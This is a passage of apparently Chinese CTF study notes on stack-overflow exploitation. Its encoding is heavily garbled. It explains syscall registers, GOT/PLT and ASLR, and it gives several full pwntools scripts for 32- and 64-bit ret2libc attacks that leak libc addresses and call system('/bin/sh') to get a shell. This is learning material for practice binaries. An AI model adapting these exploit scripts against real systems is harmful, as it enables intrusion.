å¿«äº†ç¼–è¯‘é€Ÿåº¦ï¼ŒèŠ‚çœäº†ç³»ç»Ÿèµ„æºã€‚ç¼ºç‚¹ä¸€æ–¹é¢æ˜¯å“ªæ€•å¾ˆç®€å•çš„ç¨‹åºï¼Œåªè¦ç”¨åˆ°äº†é“¾æ¥åº“ä¸­çš„ä¸€ä¸¤æ¡å‘½ä»¤ï¼Œä¹Ÿè¦é™„å¸¦ä¸€ä¸ªåºå¤§çš„é“¾æ¥åº“ï¼›å¦ä¸€æ–¹é¢æ˜¯å¦‚æœå…¶ä»–è®¡ç®—æœºä¸Šæ²¡æœ‰å®‰è£…å¯¹åº”çš„è¿è¡Œåº“ï¼Œåˆ™ç»è¿‡åŠ¨æ€ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶å°±ä¸èƒ½è¿è¡Œã€‚ é™æ€ç¼–è¯‘çš„ä¼˜ç¼ºç‚¹ä¸åŠ¨æ€ç¼–è¯‘æ­£å¥½ç›¸åã€‚ é™æ€ç¼–è¯‘å¯ä»¥ç®€å•ç†è§£ä¸ºå°†åŠ¨æ€é“¾æ¥åº“ä¸­çš„ä»£ç æ‹·è´å‡ºæ¥æ”¾å…¥å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶é‡Œã€‚ å¯„å­˜å™¨ åœ¨32ä½ç³»ç»Ÿä¸­ï¼Œé€šè¿‡int 0x80æŒ‡ä»¤è§¦å‘ç³»ç»Ÿè°ƒç”¨ã€‚å…¶ä¸­ï¼ŒEAXå¯„å­˜å™¨ç”¨äºä¼ é€’ç³»ç»Ÿè°ƒç”¨å·ï¼Œå‚æ•°æŒ‰é¡ºåºèµ‹å€¼ç»™EBXã€ECXã€EDXã€ESIã€ EDIã€EBPè¿™6ä¸ªå¯„å­˜å™¨ã€‚ åœ¨64ä½ç³»ç»Ÿä¸­ï¼Œä½¿ç”¨syscallæŒ‡ä»¤æ¥è§¦å‘ç³»ç»Ÿè°ƒç”¨ï¼ŒåŒæ ·ä½¿ç”¨EAXï¼ˆRAXï¼‰å¯„å­˜å™¨ä¼ é€’ç³»ç»Ÿè°ƒç”¨å·ï¼ŒRDIã€RSIã€RDXã€RCXã€R8ã€R9 è¿™6ä¸ªå¯„å­˜å™¨ç”¨æ¥ä¼ é€’å‚æ•°ã€‚ eg:readï¼ˆ0,buf,0x100ï¼‰ 32ä½æ—¶ï¼Œeax&#x3D;3ï¼ˆ#define__NR_read 3ï¼‰;ebx&#x3D;0;ecx&#x3D;buf;edx&#x3D;0x100;ï¼Œè®¾ç½®å®Œæ¯ä¸ªå¯„å­˜å™¨çš„å€¼ä¹‹åï¼Œå†æ‰§è¡Œint 0x80æŒ‡ä»¤ï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„readï¼ˆ0,buf,0x100ï¼‰ã€‚å®é™…ä¸Šï¼Œæœ€åè¿˜ä¼šè¿›å…¥å†…æ ¸æ€æ‰§è¡Œã€‚ 64ä½æ—¶ï¼Œrax&#x3D;0ï¼ˆ#define__NR_read 0ï¼‰;rdi&#x3D;0;rsi&#x3D;buf;rdx&#x3D;0x100ï¼Œè®¾ç½®å®Œæ¯ä¸ªå¯„å­˜å™¨çš„å€¼ä¹‹åï¼Œå†æ‰§è¡ŒsyscallæŒ‡ä»¤ï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„readï¼ˆ0,buf,0x100ï¼‰ã€‚ ä¹Ÿæ˜¯è¿›å…¥å†…æ ¸æ€æ‰§è¡Œã€‚ å¦‚æœæƒ³è¦å®ŒæˆGet shell 32ä½æ—¶ï¼Œï¼šeax&#x3D;11ï¼ˆ#define__NR_execve 11ï¼‰;ebx&#x3D;â€&#x2F;bin&#x2F;shâ€;ecx&#x3D;0;edx&#x3D;0;ï¼ˆNULLå®é™…ä¸Šå°±æ˜¯0ï¼‰ï¼Œè®¾ç½®å®Œæ¯ä¸ªå¯„å­˜å™¨çš„å€¼ä¹‹åï¼Œå†æ‰§è¡Œint 0x80æŒ‡ä»¤ï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„execveï¼ˆâ€&#x2F;bin&#x2F;shâ€,NULL,NULLï¼‰ã€‚ 64ä½æ—¶ï¼Œrax&#x3D;59ï¼ˆ#define__NR_execve 59ï¼‰;rdi&#x3D;â€&#x2F;bin&#x2F;shâ€;rsi&#x3D;0;rdx&#x3D;0; åœ¨idaä¸­çº¢è‰²ä¸ºå¤–éƒ¨å‡½æ•°ï¼Œç™½è‰²ä¸ºå†…éƒ¨å‡½æ•° é™æ€ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶å…¨ä¸ºå†…éƒ¨å‡½æ•° ret2libc3 è„šæœ¬123456789101112131415161718192021222324252627282930313233343536373839from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3&quot;)#gdb.attach(p, &quot;b *0x0804854C&quot;)elf = ELF(&quot;./ret2libc3&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]main_addr = 0x0804854E# æ³„éœ² gets åœ°å€p.recvuntil(&quot;ret2libc3\\n&quot;)payload1 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)p.sendline(payload1)# è·å–æ³„éœ²åœ°å€leak_addr = u32(p.recv(4))# ç”¨ LibcSearcher æŸ¥libc = LibcSearcher(&quot;gets&quot;, leak_addr)#LibcSearcher ä¼šæ ¹æ®ä½ æä¾›çš„å‡½æ•°åå’Œåœ°å€ï¼Œå»åŒ¹é…å·²çŸ¥çš„ libc æ•°æ®åº“libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.dump(&quot;gets&quot;)æ˜¯gets å‡½æ•°åœ¨ libc ä¸­çš„åç§»ï¼ˆç›¸å¯¹äº libc åŸºåœ°å€ï¼‰system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;system: &quot; + hex(system_addr))log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))#è¾“å‡ºè¿™ä¸ªè®¡ç®—å‡ºçš„åœ°å€ï¼Œä¾¿äºæ£€æŸ¥# ç¬¬äºŒæ¬¡æ”»å‡»p.recvuntil(&quot;ret2libc3\\n&quot;)payload2 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)p.sendline(payload2)p.interactive() payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got) è°ƒç”¨putå‡½æ•°æ³„éœ²getså‡½æ•°çš„å®é™…åœ°å€ï¼Œå¹¶ä¸”è¿”å›mainå‡½æ•°ï¼Œå†æ¬¡åˆ©ç”¨gotæ¼æ´ å®ƒå†…éƒ¨ä½¿ç”¨çš„æ˜¯ é¢„å®šä¹‰ç¬¦å·å ï¼Œæ¯”å¦‚ï¼š &quot;system&quot; &quot;gets&quot; &quot;printf&quot; &quot;str_bin_sh&quot; ï¼ˆå°±æ˜¯ä½ è¦æ‰¾çš„ /bin/shï¼‰ è¿™äº›åå­—ä¸æ˜¯éšä¾¿å†™çš„ï¼Œæ˜¯é¢„å…ˆåœ¨ libc æ•°æ®åº“ä¸­å®šä¹‰å¥½çš„ç¬¦å·åç§°ã€‚ è„šæœ¬æ‰§è¡Œåä¼šæ˜¾ç¤º è¿™æ˜¯å› ä¸ºç”¨libc &#x3D; LibcSearcher(â€œgetsâ€, leak_addr)è¿›è¡Œé€‰æ‹©é€‚åˆçš„libcåº“ï¼Œä½†ä¸åŒç‰ˆæœ¬çš„libc.soæ–‡ä»¶çš„å˜åŒ–ä¸å¤§ï¼Œä¸€ä¸ªå‡½æ•°çš„åœ°å€çº¦æŸä¸å¤Ÿä¸¥æ ¼ï¼Œæ‰€ä»¥ä¼šæ˜¾ç¤ºå¤šä¸ªlibcç‰ˆæœ¬ä¾›é€‰æ‹© è§£å†³å¤šä¸ªlibc.soç‰ˆæœ¬ä¾›é€‰æ‹©1.å¤šä¸ªçº¦æŸæ¡ä»¶ å“ªäº›ç¬¦å·æœ€ç¨³å¦¥ è¿™æ˜¯ä¸ªå¾ˆé‡è¦çš„é—®é¢˜ï¼š ä¸ºä»€ä¹ˆæ³„éœ² gets &#x2F; puts &#x2F; printfï¼Œä¸æ³„éœ² malloc &#x2F; exit &#x2F; system å‘¢ï¼Ÿ ç†ç”±ï¼š ç¬¦å· ç¨³å¦¥ç¨‹åº¦ åŸå›  puts ğŸ‘ å‡ ä¹æ¯ä¸ª libc é‡Œéƒ½æœ‰ï¼Œåç§»ç‹¬ç‰¹ printf ğŸ‘ å¸¸è§ï¼Œåç§»ç‹¬ç‰¹ gets ğŸ‘ï¼ˆä½†æ˜¯ glibc2.28+ è¢«åºŸå¼ƒäº†ï¼‰ read ğŸ‘ æ ¸å¿ƒ IOï¼Œå­˜åœ¨ä¸”ç¨³å®š write ğŸ‘ å’Œ read å¯¹åº” system ğŸ‘ å¾ˆå¸¸ç”¨ï¼Œä½†æ˜¯æœ‰çš„ libc æŠŠå®ƒé™æ€é“¾æ¥äº†æˆ–è€…ä½ç½®å¾ˆå¸¸è§ exit ğŸ‘ åç§»è¾ƒå°ä¸”å¸¸è§ï¼Œä¸å»ºè®®ç”¨ __libc_start_main ğŸ‘ éå¸¸ç¨³å¦¥ï¼Œé€šå¸¸ä¸ä¼šå†²çª å› æ­¤å»ºè®®ä½ æ³„éœ²çš„ä¼˜å…ˆçº§æ˜¯ï¼š 1puts &gt; printf &gt; read &gt; write &gt; __libc_start_main &gt; gets ç†æƒ³çŠ¶æ€ä¸‹ï¼Œä½ ä¸€æ¬¡æ€§æ³„éœ²ä¸‰ä¸ªç¬¦å·ï¼Œæ¯”å¦‚ï¼š 123puts(gets@got);puts(puts@got);puts(printf@got); ç„¶åç”¨ä¸‰ä¸ªç¬¦å·å»æŸ¥åº“ï¼Œå‡ ä¹100%å”¯ä¸€ ä½†æ˜¯ å½“ç¨‹åºç¼–è¯‘æ—¶ï¼Œåªæœ‰çœŸæ­£è¢«è°ƒç”¨çš„å¤–éƒ¨åº“å‡½æ•°æ‰ä¼šè¢«é“¾æ¥ï¼Œå¹¶ä¸”å®ƒä»¬æ‰ä¼šåœ¨ GOT è¡¨é‡Œæœ‰æ¡ç›®ã€‚ è€Œä½ çš„ç›®æ ‡ç¨‹åº ./ret2libc3 é‡Œï¼š 12bashå¤åˆ¶ç¼–è¾‘gets, puts æœ‰ç”¨åˆ°printf æ²¡ç”¨åˆ° æ‰€ä»¥ï¼šåªèƒ½æœ‰ä¸¤ä¸ªçº¦æŸæ¡ä»¶ 123csså¤åˆ¶ç¼–è¾‘elf.got[&quot;gets&quot;] âœ… å­˜åœ¨elf.got[&quot;puts&quot;] âœ… å­˜åœ¨elf.got[&quot;printf&quot;] âŒ æŠ¥é”™ è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3&quot;)elf = ELF(&quot;./ret2libc3&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]#putsçš„gotè¡¨main_addr = 0x0804854Ep.recvuntil(&quot;ret2libc3\\n&quot;)payload1 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)payload1 += p32(puts_plt) + p32(main_addr) + p32(puts_got)#è¾“å‡ºputsçš„å®é™…ä½ç½®p.sendline(payload1)leak_addr = u32(p.recv(4))leak_puts = u32(p.recv(4))#æ¥æ”¶å…¶ä½ç½®libc = LibcSearcher(&quot;gets&quot;, leak_addr)libc.add_condition(&quot;puts&quot;, leak_puts)#å¢åŠ putsçš„ä½ç½®ä½œä¸ºçº¦æŸæ¡ä»¶libc_base = leak_addr - libc.dump(&quot;gets&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;system: &quot; + hex(system_addr))log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))p.recvuntil(&quot;ret2libc3\\n&quot;)payload2 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)p.sendline(payload2)p.interactive() ä½†æ˜¯è¿™ä¸ªæˆ‘å°è¯•è¿‡å¯¹è¿™ä¸ªé¢˜ç›®æ¥è¯´è¿˜æ˜¯çº¦æŸæ¡ä»¶å¤ªå°‘ï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªé¢˜ç›®è°ƒç”¨å‡½æ•°æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥å¯ä»¥ä½œä¸ºçº¦æŸçš„å‡½æ•°ä¹Ÿæ¯”è¾ƒå°‘ 1ï¼‰GOTã€‚GOTæ˜¯å…¨å±€åç§»é‡è¡¨ï¼ˆGlobal Offset Tableï¼‰ï¼Œç”¨äºå­˜å‚¨å¤–éƒ¨å‡½æ•°åœ¨å†…å­˜ä¸­çš„ç¡®åˆ‡åœ°å€ã€‚GOTå­˜å‚¨åœ¨æ•°æ®æ®µï¼ˆData Segmentï¼‰å†…ï¼Œå¯ä»¥åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­è¢«ä¿®æ”¹ã€‚ 2ï¼‰PLTæ˜¯ç¨‹åºé“¾æ¥è¡¨ï¼ˆProcedure Linkage Tableï¼‰ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°çš„å…¥å£ç‚¹ï¼ˆentryï¼‰ï¼Œæ¢è¨€ä¹‹ï¼Œç¨‹åºä¼šåˆ°PLTä¸­å¯»æ‰¾å¤–éƒ¨å‡½æ•°çš„åœ°å€ã€‚PLTå­˜å‚¨åœ¨ä»£ç æ®µï¼ˆCode Segmentï¼‰å†…ï¼Œåœ¨è¿è¡Œä¹‹å‰å°±å·²ç»ç¡®å®šå¹¶ä¸”ä¸ä¼šè¢«ä¿®æ”¹ã€‚ ç®€å•æ¥è®²ï¼ŒGOTæ˜¯ä¸ªæ•°æ®è¡¨ï¼Œå­˜å‚¨çš„æ˜¯å¤–éƒ¨å‡½æ•°çš„åœ°å€ï¼Œå…·æœ‰è¯»å†™æƒé™ï¼ˆåœ¨FULL RELROä¿æŠ¤æœºåˆ¶å¼€å¯çš„æ—¶å€™ï¼Œæ²¡æœ‰è¯»å†™æƒé™ï¼‰ï¼›PLTæ˜¯å¤–éƒ¨å‡½æ•°çš„å…¥å£è¡¨ï¼Œå­˜å‚¨çš„æ˜¯æ¯ä¸ªå¤–éƒ¨å‡½æ•°çš„ä»£ç ï¼Œå…·æœ‰æ‰§è¡Œæƒé™ã€‚ å°½ç®¡ libc çš„åŠ è½½åœ°å€æ˜¯éšæœºçš„ï¼ˆASLRï¼‰ï¼Œä½†åœ¨libcä¸åŒçš„æƒ…å†µä¸‹ libc å†…éƒ¨æ‰€æœ‰å‡½æ•°ç›¸å¯¹äº libc åŸºåœ°å€çš„åç§»é‡æ˜¯å›ºå®šä¸å˜çš„ã€‚è¿™æ˜¯ ret2libc æ”»å‡»çš„åŸºç¡€ã€‚ å®é™…åœ°å€&#x3D;åŸºå€+åç§» å½“ä½ å†™äº†ä¸€ä¸ªç¨‹åºä½¿ç”¨äº† libc ä¸­çš„å‡½æ•°ï¼ˆå¦‚ printfï¼‰ï¼Œè¿™ä¸ªå‡½æ•°çš„å…·ä½“åœ°å€åœ¨ç¼–è¯‘æ—¶æ˜¯æœªçŸ¥çš„ï¼Œå› ä¸º libc è¢«åŠ è½½çš„ä½ç½®ä¼šå›  ASLRï¼ˆåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼‰è€Œå˜åŒ–ã€‚ å‡½æ•°åç§° å†…å®¹ PLT æä¾›è·³è½¬æ¡©ä»£ç  GOT å­˜æ”¾å®é™…å‡½æ•°åœ°å€ å½“ä½ çš„ç¨‹åºè°ƒç”¨ printf() æ—¶ï¼Œå®é™…ä¸Šè°ƒç”¨çš„æ˜¯ PLT ä¸­çš„ printf@pltï¼ŒPLT å†é€šè¿‡ GOT æŸ¥æ‰¾çœŸæ­£çš„åœ°å€ã€‚ ğŸ” æ€»ç»“å¯¹æ¯”ï¼ˆé‡ç‚¹æ¥äº†ï¼ï¼‰ ä¸ºä»€ä¹ˆå¯ä»¥ç”¨ system@pltï¼Ÿ å› ä¸ºå®ƒæ˜¯ libc ä¸­system()å‡½æ•°çš„â€œå…¥å£å¤§é—¨â€ï¼Œè¿›å»ä»¥åå°±ä¼šè‡ªåŠ¨è·³è¿‡å»ï¼Œä¸ç”¨ä½ è‡ªå·±å»æ‰¾è·¯ã€‚ ä¸ºä»€ä¹ˆä¸ç”¨ GOTï¼Ÿ å› ä¸ºæˆ‘ä»¬ä¸æ˜¯è¦è¯»å–åœ°å€ï¼Œè€Œæ˜¯è¦è°ƒç”¨å‡½æ•°ã€‚PLT å°±åƒæŒ‰é’®ï¼ŒæŒ‰ä¸‹å»å°±èƒ½è¿è¡Œå‡½æ•°ï¼Œä¸éœ€è¦å…ˆçœ‹åœ°å€ã€‚ ä»€ä¹ˆæ—¶å€™å¿…é¡»ç”¨ GOTï¼Ÿ å½“ä½ åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šä¸çŸ¥é“ libc ç‰ˆæœ¬å’Œåœ°å€æ—¶ï¼Œå¿…é¡»å…ˆé€šè¿‡ GOT æ³„éœ²ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œæ‰èƒ½è®¡ç®—å‡ºå…¶ä»–å‡½æ•°çš„åœ°å€ã€‚ ä»€ä¹ˆæ—¶å€™èƒ½ç›´æ¥ç”¨ PLTï¼Ÿ å½“ä½ åœ¨æœ¬åœ°è°ƒè¯•ã€libc æ˜¯å›ºå®šçš„ï¼Œè€Œä¸”ç¨‹åºæ²¡å¼€ PIEï¼ˆåœ°å€ä¸éšæœºåŒ–ï¼‰çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥è°ƒç”¨ PLTã€‚ ret2libc3 å¯ä»¥ç”¨ ret2syscall çš„æ–¹æ³•æ¥æ”»å‡»ï¼Œåªéœ€è¦æ‰¾åˆ°ç‰¹å®šçš„ã€å›ºå®šçš„ ROP gadgets å’Œ int 0x80 æŒ‡ä»¤ã€‚ é€‰æ‹© ret2libc çš„æ–¹æ³•ï¼Œé€šå¸¸æ˜¯å› ä¸º system() å‡½æ•°æä¾›çš„ä¾¿æ·æ€§æ›´é«˜ï¼Œè™½ç„¶å¤šäº†ä¸€æ­¥ libc æ³„éœ²çš„å¼€é”€ï¼Œä½†åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™ç§æ–¹æ³•æ›´â€œç®€å•â€ä¸”æ›´â€œé€šç”¨â€ã€‚ åœ¨å®é™…çš„ CTF æ¯”èµ›ä¸­ï¼Œæ”»å‡»è€…ä¼šæ ¹æ®ç›®æ ‡ç¨‹åºçš„å…·ä½“æƒ…å†µï¼ˆæ˜¯å¦æœ‰æ˜“äºåˆ©ç”¨çš„ int 0x80ã€æ˜¯å¦æœ‰è¶³å¤Ÿçš„ gadgetsã€æ˜¯å¦æœ‰ &quot;/bin/sh&quot; å­—ç¬¦ä¸²ç­‰ï¼‰æ¥é€‰æ‹©æœ€ç®€å•ã€æœ€å¯é çš„æ”»å‡»æ–¹æ³•ã€‚ ret2libc3 ä¹‹æ‰€ä»¥éœ€è¦æ³„éœ² libc åœ°å€ï¼Œæ˜¯å› ä¸ºå®ƒä¾èµ–äºè°ƒç”¨ libc åº“ä¸­ï¼ˆè€Œéç¨‹åºè‡ªèº«ï¼‰çš„å°è£…å‡½æ•°ï¼ˆå¦‚ system()ï¼‰ï¼Œè€Œè¿™äº› libc å‡½æ•°çš„åœ°å€ä¼šå—åˆ° ASLR (åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–) çš„å½±å“è€ŒéšæœºåŒ–ã€‚ret2syscall èƒ½å¤Ÿä¸æ³„éœ² libc åœ°å€ï¼Œæ˜¯å› ä¸ºå®ƒä¾èµ–äºç¨‹åºè‡ªèº«æˆ–åŠ è½½åˆ°å›ºå®šåœ°å€çš„å…±äº«åº“ä¸­çš„ ROP gadget å’Œ int 0x80 æŒ‡ä»¤ï¼Œè¿™äº›åœ°å€åœ¨æ²¡æœ‰ PIE (ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶) çš„æƒ…å†µä¸‹æ˜¯å›ºå®šçš„ã€‚ ret2libc3_x6432ä½ç¨‹åºçš„payloadéƒ½æ˜¯åœ¨è¿”å›åœ°å€ä¹‹ååŠ ä¸Šå‚æ•°ï¼Œè€Œ64ä½æ˜¯åœ¨è¿”å›åœ°å€ä¹‹å‰æŠŠå‚æ•°æ”¾å…¥å¯„å­˜å™¨ä¸­ 64ä½ç¨‹åºå’Œ32ä½ç¨‹åºçš„ROPæŠ€æœ¯çš„ä¸åŒç‚¹åœ¨äºå‚æ•°ä¼ é€’çš„æ–¹å¼ä¸åŒã€‚64ä½ç¨‹åºçš„å‰6ä¸ªå‚æ•°æ˜¯rdi,rsi,rdx,rcx,r8,r9ï¼Œåç»­å‚æ•°æ‰ä¼šæ”¾åœ¨æ ˆä¸Šï¼Œæ‰€ä»¥64ä½ç¨‹åºçš„ROPå’Œret2syscallå‡ ä¹æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯å…ˆæ§åˆ¶å¯„å­˜å™¨ï¼Œå†è·³è½¬åˆ°å¯¹åº”çš„å‡½æ•°è¿›è¡Œæ“ä½œã€‚ è„šæœ¬1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3_x64&quot;)#gdb.attach(p,&quot;b *0x00000000004006F1&quot;)elf = ELF(&quot;./ret2libc3_x64&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]main_addr = elf.symbols[&quot;main&quot;]rdi = 0x0000000000400783 # pop rdi ; retret_gadget = 0x0000000000400784 # Assuming this is a &#x27;ret&#x27; instruction for stack alignmentp.recvuntil(b&quot;ret2libc3_x64\\n&quot;)payload1 = b&quot;a&quot; * (0x108)payload1 += p64(rdi) + p64(gets_got)payload1 +=p64(puts_plt)+p64(main_addr)p.sendline(payload1)leak_addr = u64(p.recv(6).ljust(8, b&quot;\\x00&quot;))libc = LibcSearcher(&quot;gets&quot;, leak_addr)libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.address = libc_base#æˆ‘æ„Ÿè§‰æ²¡ä»€ä¹ˆç”¨log.success(&quot;libc_base:&quot; + hex(libc_base))system = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)# ====== ä¿®æ”¹å¼€å§‹ï¼šæ·»åŠ  GDB åŠ¨æ€ä¸‹æ–­ç‚¹ ======gdb.attach(p, f&#x27;b *&#123;hex(system)&#125;&#x27;) # åœ¨ system åœ°å€å¤„ä¸‹æ–­ç‚¹# ====== ä¿®æ”¹ç»“æŸ ======p.recvuntil(b&quot;ret2libc3_x64\\n&quot;)payload2 = b&quot;a&quot; * (0x108)payload2 += p64(rdi) + p64(binsh)payload2 += p64(ret_gadget)payload2 += p64(system)p.sendline(payload2)p.interactive() å¯¹äºpayload2ç”±äºè€ƒè™‘å †æ ˆå¹³è¡¡ï¼Œæ‰€ä»¥ä¼šæœ‰ä¸¤ä¸ªretæŒ‡ä»¤æ”¾åœ¨ä¸€èµ· payload2 +&#x3D; p64(rdi) + p64(binsh)payload2 +&#x3D; p64(ret_gadget) å †æ ˆå¹³è¡¡64ä½ç¨‹åºä¸­ï¼Œå‡½æ•°è°ƒç”¨å‰ï¼Œæ ˆæŒ‡é’ˆï¼ˆrspï¼‰å¿…é¡»æ˜¯ 16 å­—èŠ‚å¯¹é½çš„ 32ä½ç¨‹åºä¸­ï¼Œå‡½æ•°è°ƒç”¨å‰åï¼Œæ ˆæŒ‡é’ˆ esp çš„å€¼åº”è¯¥ä¿æŒä¸å˜ï¼ˆ32ä½ä¸€èˆ¬ä¸è€ƒè™‘å †æ ˆå¹³è¡¡ï¼‰ âœ… ä¸€ã€é™æ€åˆ†æï¼šè®¡ç®—æ ˆåç§» ä¸ºäº†æ ˆå¯¹é½ï¼ˆé¿å…å´©æºƒï¼‰ï¼Œä½ æ„é€ çš„ payload ä¸­â€œé™¤äº†å¡«å……éƒ¨åˆ†â€ä¹‹å¤–çš„å†…å®¹ï¼ˆå³ gadget å’Œå‚æ•°ï¼‰æœ€å¥½æ˜¯ä¸€ä¸ªå¶æ•°å—ï¼ˆ8 å­—èŠ‚ä¸ºä¸€å—ï¼‰ âœ… äºŒã€åŠ¨æ€è°ƒè¯•ï¼šä½¿ç”¨ GDB æŸ¥çœ‹ rsp çš„å€¼ å¯¹äºè¿™ä¸€é¢˜æ¥è¯´ï¼Œåœ¨ç¡®å®šäº†libc.soåº“å’ŒlibcåŸºå€ä¹‹åï¼Œåœ¨systemå‡½æ•°å†…åœ¨systemå¤„è®¾ç½®æ–­ç‚¹ ä¹‹åè¿è¡Œè¿™ä¸ªè„šæœ¬ è¿™é‡Œå°±é€‰æ‹©å¥½libcç‰ˆæœ¬äº† ä¹‹ååŠ¨æ€è°ƒè¯•æŸ¥çœ‹ åœ¨åˆšè¿›å…¥è¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€æ­¥ï¼Œå°±å·²ç»å¤„äºä¸å¹³è¡¡çš„çŠ¶æ€äº† å› ä¸ºå®ƒåœ¨è°ƒç”¨å‰æ˜¯æ ˆå¹³è¡¡ï¼Œè°ƒç”¨æ—¶ä¼šæœ‰push rsp æŒ‡ä»¤æ”¹å˜ æŸ¥çœ‹æ ˆé¡¶çš„å‘½ä»¤æ˜¯ 1info register rsp æ³¨æ„å¯¹äºæ„é€ çš„ropé“¾ å¡«å……è¿”å›åœ°å€ å¡«å……çš„è¿”å›åœ°å€ æ•ˆæœ main() è®©ç¨‹åºé‡æ–°è¿è¡Œ main å‡½æ•°ï¼ˆå¯é‡å¤åˆ©ç”¨ï¼‰ _start é‡æ–°å¼€å§‹æ•´ä¸ªç¨‹åº shellcode åœ°å€ å¦‚æœä½ æƒ³ç»§ç»­æ‰§è¡Œè‡ªå·±çš„ä»£ç  exit()æˆ–_exit() å®‰å…¨é€€å‡ºç¨‹åº è¿”å›åœ°å€å†™0çš„æ—¶å€™å¶å°”ä¼šæŠ¥é”™ è¿”å›åœ°å€å¤„ç†ğŸ¯ 2. 32 ä½ vs 64 ä½åœ°å€ é¡¹ç›® 32 ä½ 64 ä½ åœ°å€é•¿åº¦ï¼ˆä½ï¼‰ 32 ä½ &#x3D; 4 å­—èŠ‚ 64 ä½ &#x3D; 8 å­—èŠ‚ Python é‡Œçš„è¡¨ç¤º 0xdeadbeef 0x7fffdeadbeef æ‰“åŒ…å‡½æ•° p32() p64() è§£åŒ…å‡½æ•° u32() u64() 32ä½æ¥æ”¶ 12leak = p.recv(4) # 32ä½æ³„éœ²ä¸€èˆ¬æ˜¯4å­—èŠ‚addr = u32(leak) # è½¬æˆ int 64ä½æ¥æ”¶ 12leak = p.recv(6) # é€šå¸¸èƒ½æ”¶åˆ°6å­—èŠ‚ï¼Œæœ‰æ—¶å€™é«˜ä¸¤å­—èŠ‚æ˜¯0addr = u64(leak.ljust(8, b&#x27;\\x00&#x27;)) # è¡¥æˆ8å­—èŠ‚å†è§£åŒ… ljust(length, fillchar) ä¼šå°†å½“å‰çš„å­—èŠ‚ä¸² leak å·¦å¯¹é½åˆ°æŒ‡å®šçš„ lengthï¼ˆè¿™é‡Œæ˜¯ 8 å­—èŠ‚ï¼‰ï¼Œå¹¶ä½¿ç”¨ fillcharï¼ˆè¿™é‡Œæ˜¯ b&#39;\\x00&#39;ï¼Œå³ç©ºå­—èŠ‚ï¼‰ä»å³ä¾§è¿›è¡Œå¡«å……ã€‚ æŸ¥çœ‹è°ƒç”¨å‡½æ•°çš„ä¼ é€’çš„å‚æ•°1payload=b&#x27;a&#x27;*(0x48+4)+p32(sys)+p32(main_addr)+p32(sh_addr) 1. åˆå§‹çŠ¶æ€ï¼ˆæ‰§è¡Œ ret å‰ï¼‰ å‡è®¾æ­¤æ—¶æ ˆå¸ƒå±€å¦‚ä¸‹ï¼ˆæ ¹æ®ä½ çš„ payloadï¼‰ï¼š python 1payload = b&#x27;a&#x27;*(0x48+4) + p32(sys) + p32(0x08048722) + p32(sh) æ ˆå†…å­˜å¸ƒå±€ï¼š text 123esp -&gt; 0x80484d0 ï¼ˆè¦†ç›–çš„è¿”å›åœ°å€ï¼ŒæŒ‡å‘ system@pltï¼‰esp + 4 -&gt; 0x08048722 ï¼ˆä¼ªé€ çš„è¿”å›åœ°å€ï¼‰esp + 8 -&gt; 0x080482ea ï¼ˆå‚æ•° &quot;sh&quot; çš„åœ°å€ï¼‰ å¯„å­˜å™¨çŠ¶æ€ï¼š eipï¼šæŒ‡å‘ GetFlag+90 çš„ ret æŒ‡ä»¤ã€‚ espï¼šæŒ‡å‘æ ˆé¡¶ 0x80484d0ã€‚ 2. æ‰§è¡Œ ret æŒ‡ä»¤ ret ç­‰ä»·äº pop eipï¼Œå…·ä½“æ“ä½œï¼š ä»æ ˆé¡¶å¼¹å‡ºè¿”å›åœ°å€åˆ° eipï¼š eip = [esp] â†’ eip = 0x80484d0ï¼ˆè·³è½¬åˆ° system@pltï¼‰ã€‚ esp = esp + 4 â†’ æ 